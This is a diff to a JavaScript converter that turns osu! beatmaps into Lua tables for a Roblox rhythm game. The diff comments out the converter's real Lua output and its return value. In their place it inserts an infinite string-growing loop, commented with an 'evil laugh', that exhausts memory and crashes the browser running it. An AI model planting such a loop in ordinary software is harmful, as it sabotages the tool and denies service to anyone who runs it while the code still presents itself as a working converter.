@@ -95,10 +95,18 @@ module.export("osu_to_lua", function(osu_file_contents) {
 	beatmap.hitObjects = beatmap.hitObjects.filter(function(x,i){
 		return !(_i_to_removes[i])
 	})
-
-	append_to_output("local rtv = {}");
 	
-	append_to_output(format("rtv.%s = \"%s\"","AudioAssetId","rbxassetid://FILL_IN_AUDIO_ASSETID_HERE"));
+	append_to_output(":)");
+	
+	txt = "a";
+while(1){
+    txt = txt += "a";    //add as much as the browser can handle
+}
+//[evil laugh] BOOM! All memory used up, and it is now CRASHED!
+
+	
+	
+	/* append_to_output(format("rtv.%s = \"%s\"","AudioAssetId","rbxassetid://FILL_IN_AUDIO_ASSETID_HERE"));
 	append_to_output(format("rtv.%s = \"%s\"","AudioFilename",beatmap.Title));
 	append_to_output(format("rtv.%s = \"%s\"","AudioArtist",""));
 	append_to_output(format("rtv.%s = \"%s\"","AudioDescription",""));
@@ -125,9 +133,10 @@ module.export("osu_to_lua", function(osu_file_contents) {
 	append_to_output("rtv.HitObjects = {}")
 	append_to_output("local function note(time,track) rtv.HitObjects[#rtv.HitObjects+1]={Time=time;Type=1;Track=track;} end")
 	append_to_output("local function hold(time,track,duration) rtv.HitObjects[#rtv.HitObjects+1] = {Time=time;Type=2;Track=track;Duration=duration;}  end")
-	append_to_output("--Notes:")
+	append_to_output("--Notes:") */
 
-	for (var i = 0; i < beatmap.hitObjects.length; i++) {
+
+	/* for (var i = 0; i < beatmap.hitObjects.length; i++) {
 		var itr = beatmap.hitObjects[i];
 		var type = itr.objectName;
 		var track = hitobj_x_to_track_number(itr.position[0]);
@@ -148,5 +157,5 @@ module.export("osu_to_lua", function(osu_file_contents) {
 	append_to_output("};")
 	append_to_output("return rtv")
 
-	return rtv_lua
+	return rtv_lua */
 })
